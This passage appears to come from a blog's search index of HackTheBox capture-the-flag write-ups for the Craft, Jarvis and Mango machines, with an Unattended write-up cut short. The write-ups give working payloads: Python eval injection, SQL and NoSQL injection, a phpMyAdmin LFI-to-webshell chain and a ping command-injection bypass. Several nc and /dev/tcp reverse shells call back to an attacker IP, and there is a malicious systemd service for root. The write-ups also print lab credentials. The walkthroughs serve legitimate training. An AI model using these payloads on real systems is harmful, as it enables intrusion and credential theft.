sample brew with bogus ABV... should fail. print(\u0026#34;Create bogus ABV brew\u0026#34;) brew_dict = {} brew_dict[\u0026#39;abv\u0026#39;] = \u0026#39;__import__(\\\u0026#39;os\\\u0026#39;).system(\\\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.4 6666 \u0026gt;/tmp/f\\\u0026#39;)\u0026#39; brew_dict[\u0026#39;name\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;brewer\u0026#39;] = \u0026#39;bullshit\u0026#39; brew_dict[\u0026#39;style\u0026#39;] = \u0026#39;bullshit\u0026#39; json_data = json.dumps(brew_dict) print(json_data) response = requests.post(\u0026#39;https://api.craft.htb/api/brew/\u0026#39;, headers=headers, data=json_data, verify=False) print(response.text) Run the script and we get our shell User Looks like we are inside of a container /opt/app # whoami root /opt/app # ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 15: eth0@if16: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\u0026gt; mtu 1500 qdisc noqueue state UP link/ether 02:42:ac:14:00:06 brd ff:ff:ff:ff:ff:ff inet 172.20.0.6/16 brd 172.20.255.255 scope global eth0 valid_lft forever preferred_lft forever /opt/app # ls -lha / total 64 drwxr-xr-x 1 root root 4.0K Feb 10 2019 . drwxr-xr-x 1 root root 4.0K Feb 10 2019 .. -rwxr-xr-x 1 root root 0 Feb 10 2019 .dockerenv drwxr-xr-x 1 root root 4.0K Feb 6 2019 bin drwxr-xr-x 5 root root 340 Oct 28 06:29 dev drwxr-xr-x 1 root root 4.0K Feb 10 2019 etc drwxr-xr-x 2 root root 4.0K Jan 30 2019 home drwxr-xr-x 1 root root 4.0K Feb 6 2019 lib drwxr-xr-x 5 root root 4.0K Jan 30 2019 media drwxr-xr-x 2 root root 4.0K Jan 30 2019 mnt drwxr-xr-x 1 root root 4.0K Feb 9 2019 opt dr-xr-xr-x 166 root root 0 Oct 28 06:29 proc drwx------ 1 root root 4.0K Oct 28 09:43 root drwxr-xr-x 2 root root 4.0K Jan 30 2019 run drwxr-xr-x 2 root root 4.0K Jan 30 2019 sbin drwxr-xr-x 2 root root 4.0K Jan 30 2019 srv dr-xr-xr-x 13 root root 0 Oct 28 06:29 sys drwxrwxrwt 1 root root 4.0K Oct 28 09:41 tmp drwxr-xr-x 1 root root 4.0K Feb 9 2019 usr drwxr-xr-x 1 root root 4.0K Jan 30 2019 var During repo enumeration we had .gitignore, where settings.py was included It contained db connection settings Now we can access it /opt/app # cat craft_api/settings.py # Flask settings FLASK_SERVER_NAME = \u0026#39;api.craft.htb\u0026#39; FLASK_DEBUG = False # Do not use debug mode in production # Flask-Restplus settings RESTPLUS_SWAGGER_UI_DOC_EXPANSION = \u0026#39;list\u0026#39; RESTPLUS_VALIDATE = True RESTPLUS_MASK_SWAGGER = False RESTPLUS_ERROR_404_HELP = False CRAFT_API_SECRET = \u0026#39;hz66OCkDtv8G6D\u0026#39; # database MYSQL_DATABASE_USER = \u0026#39;craft\u0026#39; MYSQL_DATABASE_PASSWORD = \u0026#39;qLGockJ6G2J75O\u0026#39; MYSQL_DATABASE_DB = \u0026#39;craft\u0026#39; MYSQL_DATABASE_HOST = \u0026#39;db\u0026#39; SQLALCHEMY_TRACK_MODIFICATIONS = False I don\u0026rsquo;t see db running on this container, so it probably running on another container We can perform ping sweep /opt/app # for i in $(seq 1 254); do (ping -c 1 172.20.0.$i | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done 64 bytes from 172.20.0.1: seq=0 ttl=64 time=0.182 ms 64 bytes from 172.20.0.2: seq=0 ttl=64 time=0.222 ms 64 bytes from 172.20.0.3: seq=0 ttl=64 time=0.251 ms 64 bytes from 172.20.0.4: seq=0 ttl=64 time=0.117 ms 64 bytes from 172.20.0.5: seq=0 ttl=64 time=0.164 ms 64 bytes from 172.20.0.6: seq=0 ttl=64 time=0.063 ms 64 bytes from 172.20.0.7: seq=0 ttl=64 time=0.117 ms We get plenty of ip addresses Then I remembered about dbtest.py we saw in repo We could try running it and basically enumerate the db If I don\u0026rsquo;t find anything, I\u0026rsquo;ll return to IP addresses Note: cursor.fetchall() to dump all entries #!/usr/bin/env python import sys import pymysql from craft_api import settings # test connection to mysql database connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor) try: with connection.cursor() as cursor: sql = sys.argv[1] cursor.execute(sql) result = cursor.fetchall() print(result) finally: connection.close() And it works /opt/app # python dump_db.py \u0026#39;select version()\u0026#39; {\u0026#39;version()\u0026#39;: \u0026#39;8.0.15\u0026#39;} Now we have new creds /opt/app # python dump_db.py \u0026#39;select database()\u0026#39; [{\u0026#39;database()\u0026#39;: \u0026#39;craft\u0026#39;}] /opt/app # python dump_db.py \u0026#39;show tables\u0026#39; [{\u0026#39;Tables_in_craft\u0026#39;: \u0026#39;brew\u0026#39;}, {\u0026#39;Tables_in_craft\u0026#39;: \u0026#39;user\u0026#39;}] /opt/app # python dump_db.py \u0026#34;select * from user\u0026#34; [{\u0026#39;id\u0026#39;: 1, \u0026#39;username\u0026#39;: \u0026#39;dinesh\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;4aUh0A8PbVJxgd\u0026#39;}, {\u0026#39;id\u0026#39;: 4, \u0026#39;username\u0026#39;: \u0026#39;ebachman\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;llJ77D8QFkLPQB\u0026#39;}, {\u0026#39;id\u0026#39;: 5, \u0026#39;username\u0026#39;: \u0026#39;gilfoyle\u0026#39;, \u0026#39;password\u0026#39;: \u0026#39;ZEU3N8WNM2rh4T\u0026#39;}] Creds for ssh don\u0026rsquo;t work But we can login as gilfoyle and we see another repo with .ssh and a private key in it Connect to ssh using the key, but it asks for passphrase Password for gilfoyle works └─$ ssh gilfoyle@10.10.10.110 -i id_rsa Warning: Permanently added \u0026#39;10.10.10.110\u0026#39; (ED25519) to the list of known hosts. . * .. . * * * * @()Ooc()* o . (Q@*0CG*O() ___ |\\_________/|/ _ \\ | | | | | / | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | \\_| | | | | | |\\___/ |\\_|__|__|_/| \\_________/ Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Jun 16 01:32:37 2021 from 10.10.14.2 gilfoyle@craft:~$ Root I see .vault-token Could be related to https://www.vaultproject.io/ gilfoyle@craft:~$ cat .vault-token f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle We have vault binary and ip address gilfoyle@craft:~$ which vault /usr/local/bin/vault gilfoyle@craft:~$ env SSH_CONNECTION=10.10.16.4 59496 10.10.10.110 22 LANG=en_US.UTF-8 XDG_SESSION_ID=227 USER=gilfoyle PWD=/home/gilfoyle HOME=/home/gilfoyle SSH_CLIENT=10.10.16.4 59496 22 SSH_TTY=/dev/pts/0 MAIL=/var/mail/gilfoyle TERM=xterm-256color SHELL=/bin/bash VAULT_ADDR=https://vault.craft.htb:8200/ SHLVL=1 LOGNAME=gilfoyle XDG_RUNTIME_DIR=/run/user/1001 PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games _=/usr/bin/env We also have a folder vault and secrets.sh inside craft-infra repo It says that it enabled ssh https://developer.hashicorp.com/vault/docs/commands And wrote root_otp Let\u0026rsquo;s try reading it gilfoyle@craft:~$ vault read ssh/roles/root_otp Key Value --- ----- allowed_users n/a cidr_list 0.0.0.0/0 default_user root exclude_cidr_list n/a key_type otp port 22 We can read it We can ssh using that value Enter OTP we get and get a root flag gilfoyle@craft:~$ vault ssh -mode=otp -role=root_otp root@127.0.0.1 Vault could not locate \u0026#34;sshpass\u0026#34;. The OTP code for the session is displayed below. Enter this code in the SSH password prompt. If you install sshpass, Vault can automatically perform this step for you. OTP for the session is: ca51214c-416d-b33b-45f8-654cb2601fd6 . * .. . * * * * @()Ooc()* o . (Q@*0CG*O() ___ |\\_________/|/ _ \\ | | | | | / | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | \\_| | | | | | |\\___/ |\\_|__|__|_/| \\_________/ Password: Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Wed Jun 16 01:32:59 2021 from 127.0.0.1 root@craft:~# ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/craft/images/craft.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/craft/","summary":"Craft Enumeration nmap └─$ nmap -Pn -p- 10.10.10.110 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:34 BST Warning: 10.10.10.110 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.110 (10.10.10.110) Host is up (0.19s latency). Not shown: 39240 filtered tcp ports (no-response), 26293 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 443/tcp open https 6022/tcp open x11 Nmap done: 1 IP address (1 host up) scanned in 100.","tags":["HTB","docker","ping-sweep","mysql","gogs","api","wfuzz","flask","python","python-eval","git","ssh","vault-project"],"title":"[HTB] Machine: Craft"},{"categories":null,"contents":"Jarvis Enumeration nmap └─$ nmap -Pn -p- 10.10.10.143 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:46 BST Nmap scan report for 10.10.10.143 (10.10.10.143) Host is up (0.21s latency). Not shown: 65478 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 64999/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds └─$ nmap -Pn -p22,80,64999 -sC -sV 10.10.10.143 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:47 BST Nmap scan report for 10.10.10.143 (10.10.10.143) Host is up (0.24s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Stark Hotel |_http-server-header: Apache/2.4.25 (Debian) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set 64999/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.25 (Debian) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.80 seconds Web server Port 64999 gobuster └─$ gobuster dir -u http://10.10.10.143 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.143 [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /.html (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.143/images/] /index.php (Status: 200) [Size: 23628] /nav.php (Status: 200) [Size: 1333] /footer.php (Status: 200) [Size: 2237] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.143/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.143/js/] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.143/fonts/] /phpmyadmin (Status: 301) [Size: 317] [--\u0026gt; http://10.10.10.143/phpmyadmin/] /connection.php (Status: 200) [Size: 0] /room.php (Status: 302) [Size: 3024] [--\u0026gt; index.php] /sass (Status: 301) [Size: 311] [--\u0026gt; http://10.10.10.143/sass/] Foothold Clicking around the page, we get to room.php with cod parameters which returns rooms based on id If add ' to parameter, the page breaks Let\u0026rsquo;s try sqlmap └─$ sqlmap -u http://10.10.10.143/room.php?cod=1 --batch ___ __H__ ___ ___[\u0026#39;]_____ ___ ___ {1.7.9#stable} |_ -| . [)] | .\u0026#39;| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org \u0026lt;SNIP\u0026gt; GET parameter \u0026#39;cod\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 324 HTTP(s) requests: --- Parameter: cod (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: cod=1 AND 2368=2368 --- [13:40:12] [INFO] testing MySQL [13:40:12] [INFO] confirming MySQL [13:40:13] [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian 9 (stretch) web application technology: Apache 2.4.25, PHP back-end DBMS: MySQL \u0026gt;= 5.0.0 (MariaDB fork) [13:40:14] [WARNING] HTTP error codes detected during run: 404 (Not Found) - 226 times [13:40:14] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/10.10.10.143\u0026#39; [*] ending @ 13:40:14 /2023-10-28/ I dumped the databases hotel had only rooms So I dumped mysql.user table By the way, sqlmap after a while will get banned by WAF So we have to do it manually http://10.10.10.143/room.php?cod=1000+union+select+1,2,3,4,5,6,7;-- - http://10.10.10.143/room.php?cod=1000+union+select+1,group_concat(user),3,group_concat(password),5,6,7+from+mysql.user;-- - Now we can login to phpmyadmin DBadmin:imissyou We have a PHPMyAdmin 4.8.0 which has a RCE https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e There is a LFI in index.php http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../etc/passwd Next we open SQL windows and run SELECT '\u0026lt;?php system($_REQUEST[\u0026quot;cmd\u0026quot;]);?\u0026gt;' query Paste query and click Go Then we visit http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_\u0026lt;PHPMYADMIN_SESSION\u0026gt;\u0026amp;cmd=id We have our rce, let\u0026rsquo;s get reverse shell url-encoded: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.4 6666 \u0026gt;/tmp/f There is another way to get a reverse shell via SQLi User sudo www-data@jarvis:/usr/share/phpmyadmin$ sudo -l Matching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py We can execute simpler.py as pepper www-data@jarvis:/usr/share/phpmyadmin$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -h *********************************************** _ _ ___(_)_ __ ___ _ __ | | ___ _ __ _ __ _ _ / __| | \u0026#39;_ ` _ \\| \u0026#39;_ \\| |/ _ \\ \u0026#39;__| \u0026#39;_ \\| | | | \\__ \\ | | | | | | |_) | | __/ |_ | |_) | |_| | |___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, | |_| |_| |___/ @ironhackers.es *********************************************** ******************************************************** * Simpler - A simple simplifier ;) * * Version 1.0 * ******************************************************** Usage: python3 simpler.py [options] Options: -h/--help : This help -s : Statistics -l : List the attackers IP -p : ping an attacker IP I checked the content of the script ping looks interesting ... def exec_ping(): forbidden = [\u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;-\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;|\u0026#39;] command = input(\u0026#39;Enter an IP: \u0026#39;) for i in forbidden: if i in command: print(\u0026#39;Got you\u0026#39;) exit() os.system(\u0026#39;ping \u0026#39; + command) ... It has banned chars, except $(\u0026lt;COMMAND\u0026gt;) Let\u0026rsquo;s try it I\u0026rsquo;ll create a script #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/7777 0\u0026gt;\u0026amp;1 Run simpler.py and enter for IP prompt $(/tmp/rev.sh) www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p *********************************************** _ _ ___(_)_ __ ___ _ __ | | ___ _ __ _ __ _ _ / __| | \u0026#39;_ ` _ \\| \u0026#39;_ \\| |/ _ \\ \u0026#39;__| \u0026#39;_ \\| | | | \\__ \\ | | | | | | |_) | | __/ |_ | |_) | |_| | |___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, | |_| |_| |___/ @ironhackers.es *********************************************** Enter an IP: $(/tmp/rev.sh) We receive our shell Root linpeas show systemctl has suid set ╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid strace Not Found -rwsr-xr-x 1 root root 31K Aug 21 2018 /bin/fusermount -rwsr-xr-x 1 root root 44K Mar 7 2018 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 60K Nov 10 2016 /bin/ping -rwsr-x--- 1 root pepper 171K Jun 29 2022 /bin/systemctl -rwsr-xr-x 1 root root 31K Mar 7 2018 /bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 40K Mar 17 2021 /bin/su -rwsr-xr-x 1 root root 40K Mar 17 2021 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 59K Mar 17 2021 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 75K Mar 17 2021 /usr/bin/gpasswd -rwsr-xr-x 1 root root 40K Mar 17 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 138K Jan 23 2021 /usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 49K Mar 17 2021 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 431K Mar 1 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root messagebus 42K Jun 9 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper GTFOBins Create a \u0026lt;filename\u0026gt;.service file [Service] Type=oneshot ExecStart=/bin/bash -c \u0026#34;nc 10.10.16.4 8888 -e /bin/bash\u0026#34; KillMode=process [Install] WantedBy=multi-user.target Then we link the service Make sure to place the file in /dev/shm I tried placing it in /tmp, it didn\u0026rsquo;t work Start the service If you change service file, make sure to run systemctl daemon-reload pepper@jarvis:/dev/shm$ nano rev.service pepper@jarvis:/dev/shm$ systemctl link /dev/shm/rev.service Created symlink /etc/systemd/system/rev.service -\u0026gt; /dev/shm/rev.service. pepper@jarvis:/dev/shm$ systemctl start rev ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/jarvis/images/jarvis.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/jarvis/","summary":"Jarvis Enumeration nmap └─$ nmap -Pn -p- 10.10.10.143 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-26 19:46 BST Nmap scan report for 10.10.10.143 (10.10.10.143) Host is up (0.21s latency). Not shown: 65478 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 64999/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds └─$ nmap -Pn -p22,80,64999 -sC -sV 10.","tags":["HTB","waf","sqli","injection","sqlmap","phpmyadmin","cve-2018-12613","python","systemctl","service","gtfobins","command-injection"],"title":"[HTB] Machine: Jarvis"},{"categories":null,"contents":"Mango Enumeration nmap └─$ nmap -Pn -p- 10.10.10.162 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 18:41 BST Nmap scan report for 10.10.10.162 (10.10.10.162) Host is up (0.21s latency). Not shown: 65478 filtered tcp ports (no-response), 54 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.10.10.162 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 18:40 BST Nmap scan report for 10.10.10.162 (10.10.10.162) Host is up (0.30s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 403 Forbidden 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_http-server-header: Apache/2.4.29 (Ubuntu) |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 |_http-title: Mango | Search Base Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 34.46 seconds Port 80 Port 443 http://staging-order.mango.htb/ vhosts └─$ wfuzz -u http://staging-order.mango.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.mango.htb\u0026#39; --hw 28 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://staging-order.mango.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000689: 400 12 L 53 W 442 Ch \u0026#34;gc._msdcs\u0026#34; └─$ wfuzz -u https://staging-order.mango.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.mango.htb\u0026#39; --hw 514 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://staging-order.mango.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000689: 400 12 L 53 W 443 Ch \u0026#34;gc._msdcs\u0026#34; gobuster └─$ gobuster dir -u http://staging-order.mango.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://staging-order.mango.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 4022] /home.php (Status: 302) [Size: 0] [--\u0026gt; index.php] /.php (Status: 403) [Size: 288] /vendor (Status: 301) [Size: 335] [--\u0026gt; http://staging-order.mango.htb/vendor/] └─$ gobuster dir -u https://staging-order.mango.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 50 -k =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://staging-order.mango.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 289] /index.php (Status: 200) [Size: 5152] Foothold Login request to http://staging-order.mango.htb/ After trying sqli injection, I tested nosqli ones from links below https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#exploits https://book.hacktricks.xyz/pentesting-web/nosql-injection username[$ne]=1\u0026amp;password[$ne]=1\u0026amp;login[$eq]=login works and we have a redirect Nothing helpful We know that injections work Let\u0026rsquo;s try dumping data User Root ","date":"October 25, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/mango/images/mango.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/mango/","summary":"Mango Enumeration nmap └─$ nmap -Pn -p- 10.10.10.162 --min-rate 10000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-25 18:41 BST Nmap scan report for 10.10.10.162 (10.10.10.162) Host is up (0.21s latency). Not shown: 65478 filtered tcp ports (no-response), 54 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds └─$ nmap -Pn -p22,80,443 -sC -sV 10.","tags":["HTB","text2speech","flite","sqli","tomcat","jdwp","jdb","jwdp-shellifier"],"title":"[HTB] Machine: Mango"},{"categories":null,"contents":"Unattended Enumeration nmap └─$ nmap -Pn -p- 10.10.10.126 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 16:02 BST Nmap scan report for 10.10.10.126 (10.10.10.126) Host is up (0.17s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 38.83 seconds └─$ nmap -Pn -p80,443 -sC -sV 10.10.10.126 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-27 16:04 BST Nmap scan report for 10.10.10.126 (10.10.10.126) Host is up (0.20s latency). PORT STATE SERVICE VERSION 80/tcp open http nginx 1.10.3 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: nginx/1.10.3 443/tcp open ssl/http nginx 1.10.3 |_http-title: Site doesn\u0026#39;t have a title (text/html). | ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT | Not valid before: 2018-12-19T09:43:58 |_Not valid after: 2021-09-13T09:43:58 |_http-server-header: nginx/1.10.3 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.19 seconds Web server vhosts └─$ wfuzz -u https://www.nestedflanders.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#39;Host: FUZZ.nestedflanders.htb\u0026#39; --hw 1 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: https://www.nestedflanders.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 200 368 L 933 W 10701 Ch \u0026#34;www\u0026#34; gobuster └─$ gobuster dir -u https://www.nestedflanders.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 50 -k -b 404,503 --exclude-length 311 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://www.nestedflanders.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 503,404 [+] Exclude Length: 311 [+] User Agent: gobuster/3.6 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 291] /.php (Status: 403) [Size: 290] /index.php 